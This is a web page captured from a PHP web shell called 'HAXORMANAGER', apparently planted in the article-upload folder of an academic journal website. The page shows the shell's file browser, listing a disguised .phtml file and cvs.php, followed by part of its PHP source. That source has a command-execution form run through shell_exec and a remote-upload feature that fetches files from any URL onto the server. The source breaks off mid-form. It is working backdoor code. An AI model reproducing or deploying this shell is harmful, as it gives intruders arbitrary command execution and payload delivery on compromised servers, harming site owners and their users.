<html><head><title>HAXORMANAGER</title><style>
    body { font-family: Arial, sans-serif; background-color: #2c2f33; color: #fff; margin: 0; padding: 0; }
    h1 { color: #7289da; text-align: center; }
    input[type="text"], input[type="url"], input[type="submit"] { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: none; }
    input[type="submit"] { background-color: #7289da; color: white; cursor: pointer; }
    table { width: 90%; margin: 20px auto; border-collapse: collapse; }
    th, td { padding: 10px; text-align: left; border: 1px solid #444; color: #fff; }
    th { background-color: #7289da; }
    a { color: #7289da; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .container { width: 80%; margin: 0 auto; }
    textarea { font-size: 14px; width: 100%; height: 600px; background-color: #23272a; color: #eee; border: none; padding: 10px; }
</style></head><body><div class="container"><h1>HAXORMANAGER</h1><p>This is a simple file manager tool created by HaxorNoname.</p><form method="post">
        <input type="text" name="cmd" placeholder="Enter command" required />
        <input type="submit" value="Execute" />
      </form><form method="post">
        <input type="url" name="remote_url" placeholder="Remote File URL" required />
        <input type="submit" value="Remote Upload" />
      </form><form method="get">
        <input type="text" name="search" placeholder="Search files or folders" />
        <input type="submit" value="Search" />
      </form><a href="?HX=/">/</a><a href="?HX=/var">var</a>/<a href="?HX=/var/www">www</a>/<a href="?HX=/var/www/jurnal.utu.ac.id">jurnal.utu.ac.id</a>/<a href="?HX=/var/www/jurnal.utu.ac.id/files">files</a>/<a href="?HX=/var/www/jurnal.utu.ac.id/files/journals">journals</a>/<a href="?HX=/var/www/jurnal.utu.ac.id/files/journals/2">2</a>/<a href="?HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles">articles</a>/<a href="?HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614">11614</a>/<a href="?HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission">submission</a>/<a href="?HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original">original</a>/<br><br><form enctype="multipart/form-data" method="POST">
        <input type="file" name="file" required />
        <input type="submit" value="Upload" />
      </form><table><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/11614-36742-3-SM.phtml">11614-36742-3-SM.phtml</a></td>
            <td>8294</td>
            <td><a href="?option=edit&HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/11614-36742-3-SM.phtml">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/11614-36742-3-SM.phtml">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/11614-36742-3-SM.phtml">Rename</a> | 
                <a href="?option=delete&HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/11614-36742-3-SM.phtml" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/11614-36742-3-SM.phtml">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/cvs.php">cvs.php</a></td>
            <td>196826</td>
            <td><a href="?option=edit&HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/cvs.php">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/cvs.php">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/cvs.php">Rename</a> | 
                <a href="?option=delete&HX=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/cvs.php" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/jurnal.utu.ac.id/files/journals/2/articles/11614/submission/original/cvs.php">Download</a>
            </td>
          </tr></table><?php
// Security Headers
header("X-XSS-Protection: 1; mode=block");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
header("Referrer-Policy: no-referrer");
header("X-Powered-By: none");

// Start output buffering and prevent script timeout
ob_start();
set_time_limit(0);

// Hide errors from being displayed
error_reporting(0);
ini_set('display_errors', 0);

// Function to sanitize user input
function sanitize_input($data) {
    return htmlspecialchars(strip_tags(trim($data)), ENT_QUOTES, 'UTF-8');
}

// Check if certain critical functions are disabled
$disabled_functions = explode(',', ini_get('disable_functions'));
$disabled_functions = array_map('trim', $disabled_functions);

function safe_exec($cmd) {
    global $disabled_functions;
    if (in_array('shell_exec', $disabled_functions)) {
        return "Error: shell_exec is disabled on this server.";
    }
    return shell_exec($cmd);
}

function safe_file_put_contents($filename, $data) {
    global $disabled_functions;
    if (in_array('file_put_contents', $disabled_functions)) {
        return "Error: file_put_contents is disabled on this server.";
    }
    return file_put_contents($filename, $data);
}

function safe_fopen($url) {
    global $disabled_functions;
    if (in_array('fopen', $disabled_functions)) {
        return "Error: fopen is disabled on this server.";
    }
    return fopen($url, 'r');
}

// Display the interface
echo '<html><head><title>HAXORMANAGER</title>';
echo '<style>
    body { font-family: Arial, sans-serif; background-color: #2c2f33; color: #fff; margin: 0; padding: 0; }
    h1 { color: #7289da; text-align: center; }
    input[type="text"], input[type="url"], input[type="submit"] { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: none; }
    input[type="submit"] { background-color: #7289da; color: white; cursor: pointer; }
    table { width: 90%; margin: 20px auto; border-collapse: collapse; }
    th, td { padding: 10px; text-align: left; border: 1px solid #444; color: #fff; }
    th { background-color: #7289da; }
    a { color: #7289da; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .container { width: 80%; margin: 0 auto; }
    textarea { font-size: 14px; width: 100%; height: 600px; background-color: #23272a; color: #eee; border: none; padding: 10px; }
</style></head><body>';

// Container div
echo '<div class="container">';
echo '<h1>HAXORMANAGER</h1>';
echo '<p>This is a simple file manager tool created by HaxorNoname.</p>';

// Command execution form
echo '<form method="post">
        <input type="text" name="cmd" placeholder="Enter command" required />
        <input type="submit" value="Execute" />
      </form>';

// Handle command execution
if (isset($_POST['cmd'])) {
    $cmd = sanitize_input($_POST['cmd']);
    echo '<pre>' . htmlspecialchars(safe_exec($cmd)) . '</pre>';
}

// Remote upload form
echo '<form method="post">
        <input type="url" name="remote_url" placeholder="Remote File URL" required />
        <input type="submit" value="Remote Upload" />
      </form>';

// Remote upload handling
if (isset($_POST['remote_url'])) {
    $remote_url = sanitize_input($_POST['remote_url']);
    $file_name = basename($remote_url);
    if (safe_file_put_contents($file_name, safe_fopen($remote_url))) {
        echo '<p><font color="green">Remote file uploaded successfully as ' . $file_name . '</font></p>';
    } else {
        echo '<p><font color="red">Remote upload failed.</font></p>';
    }
}

// File search form
echo '<form method="get">
        <input type="text" name="search" placeholder="Se